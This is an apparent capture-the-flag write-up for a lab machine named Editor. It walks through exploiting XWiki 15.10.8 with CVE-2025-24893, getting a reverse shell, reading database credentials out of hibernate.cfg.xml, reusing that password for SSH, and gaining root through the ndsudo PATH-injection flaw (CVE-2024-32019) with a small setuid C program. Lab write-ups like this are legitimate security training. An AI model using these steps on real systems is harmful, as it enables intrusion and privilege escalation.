# Scanning

## Rustscan

- Rustscan revealed three open ports:
    - `22` â€“ SSH    
    - `80` â€“ HTTP service on the root domain `(editor.htb)`
    - `8080` â€“ Another HTTP service running on a subdomain `(wiki.editor.htb)`

## Nmap

```bash

The Nmap scan confirms what Rustscan reported, but also provides additional details about the services running behind these ports.

# Enumeration

- **Port 80** `(http://editor.htb)`
    - The page looked like a typical static website with nothing particularly interesting.

![Pasted image 20250815172542.png](images/Pasted_image_20250815172542.png)

- **Port 8080** `(http://wiki.editor.htb/)`
    - This page revealed that the service is running **XWiki Debian 15.10.8**.
    - From here, the natural next step was to look for known vulnerabilities or exploits affecting this specific version.

# Exploitation

After some quick searching, I discovered that this version of **XWiki** is vulnerable to **RCE (Remote Code Execution)**.  
I found a working [POC](https://github.com/Infinit3i/CVE-2025-24893) and decided to adapt it for my target.
## Setting up the POC

- I customized the exploit with target-specific details.

![Pasted image 20250815173143.png](images/Pasted_image_20250815173143.png)

- Testing a simple command like `id` gave me a valid response, confirming **command execution worked**.

![Pasted image 20250815173844.png](images/Pasted_image_20250815173844.png)

## Getting a Service Reverse Shell

- I then moved on to getting a reverse shell for a more stable foothold.

![Pasted image 20250815174219.png](images/Pasted_image_20250815174219.png)

![Pasted image 20250815174257.png](images/Pasted_image_20250815174257.png)

- To make the shell interactive and stable, I upgraded it using:

```bash
/bin/bash -i
```

---

## Post-Exploitation Enumeration

- My initial thought was to look for **hardcoded credentials**, since many easy boxes hide passwords in common configuration files.  
- I asked GPT for common file names, and it pointed me to `hibernate.cfg.xml`.

![Pasted image 20250815174804.png](images/Pasted_image_20250815174804.png)

- The file existed on the system:

![Pasted image 20250815175046.png](images/Pasted_image_20250815175046.png)

- Inside, I found the following credentials:

```xml
<property name="hibernate.connection.username">xwiki</property>
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

- So, the credentials were:
	- **Username:** `xwiki`
	- **Password:** `theEd1t0rTeam99`
- These looked like database credentials, so I attempted to log into MySQL using them.

---

### Accessing MySQL

```sql
mysql -u xwiki -p xwiki
Enter password: theEd1t0rTeam99
```

- I successfully logged in and enumerated the databases and tables.

![Pasted image 20250815175928.png](images/Pasted_image_20250815175928.png)

- Unfortunately, while I could explore the `xwiki` database, the table `xwikiusers` didnâ€™t exist. So no direct user creds were available from MySQL.

---

## Thinking Outside the Box

- At this point, I stepped back and thought about **password reuse**.  
- I already knew of a system user named `oliver`. Out of curiosity, I tried:

```
oliver : theEd1t0rTeam99
```

- And surprisingly, it worked! ðŸŽ‰
- This confirmed a **password reuse vulnerability**. While it may look like guesswork, this is actually very realistic, since many real-world systems fall victim to reused credentials.

---

## Getting User Shell via SSH

- Using the reused password, I logged in as `oliver` via SSH and captured the **user flag**.

# Post Exploitation

- I proceeded with typical privilege escalation checks:
	- Running `sudo -l`
	- Searching for SUID binaries
	- Checking network connections

![Pasted image 20250815181012.png](images/Pasted_image_20250815181012.png)

![Pasted image 20250815181154.png](images/Pasted_image_20250815181154.png)

- At first, nothing looked promising. I also tried kernel exploits for `Linux editor 5.15.0-151-generic`, but none of them worked.

![Pasted image 20250815181541.png](images/Pasted_image_20250815181541.png)

- So, I switched to `linpeas` for a deeper scan.

![Pasted image 20250815183153.png](images/Pasted_image_20250815183153.png)

- Interestingly, I discovered an unusual SUID binary called `ndsudo`. I had overlooked it earlier, but this was clearly the key to privilege escalation.

![Pasted image 20250815184003.png](images/Pasted_image_20250815184003.png)

---

## Understanding the Binary

- I examined `ndsudo` to understand its purpose. It allowed running specific commands, but it wasnâ€™t a standard privilege escalation tool.

![Pasted image 20250815184105.png](images/Pasted_image_20250815184105.png)

![Pasted image 20250815184236.png](images/Pasted_image_20250815184236.png)

- After digging deeper (with GPTâ€™s help), I found that it was vulnerable to **CVE-2024-32019**. A public POC was available: [CVE-2024-32019-POC](https://github.com/AliElKhatteb/CVE-2024-32019-POC).

- Although I didnâ€™t use the exact exploit, I used it as inspiration.

---

## Gaining Root Shell

- I created a small C program that forces the UID and GID to root, then spawns a shell:

```c
#include <unistd.h>  // setuid, setgid, execl
#include <stddef.h>  // NULL

int main() {
    setuid(0);   // force UID to root
    setgid(0);   // force GID to root group
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

- Compiled it with:

```bash
x86_64-linux-gnu-gcc -o nvme exploit.c -static 
```

- Then transferred it to the target, made it executable, and exploited the `PATH` injection trick by modifying `$PATH`:

```bash
PATH=$(pwd):$PATH
```

- Finally, I executed `ndsudo` with my custom binary and popped a **root shell**. ðŸš€
